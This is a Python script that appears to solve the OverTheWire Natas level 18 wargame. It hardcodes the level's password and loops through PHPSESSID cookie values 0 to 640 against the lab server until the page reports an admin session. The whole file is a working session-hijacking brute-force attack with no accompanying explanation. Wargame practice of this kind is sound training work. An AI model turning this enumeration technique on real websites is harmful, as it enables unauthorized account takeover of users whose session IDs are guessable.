import requests

username = "natas18"
password = "xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP"

session = requests.Session()

url = "http://{}.natas.labs.overthewire.org/".format(username)

# response = session.post(
#     url, data={"username": "admin", "password": "password"}, auth=(username, password))
# print(session.cookies)

max_id = 640
admin_id = 0

for session_id in range(max_id + 1):
    print("Trying session id {} now".format(session_id))
    response = session.get(
        url, cookies={"PHPSESSID": "{}".format(session_id)}, auth=(username, password))
    content = response.text
    if "You are an admin." in content:
        admin_id = session_id
        print(content)
        break

print("Session id for admin found: {}".format(admin_id))
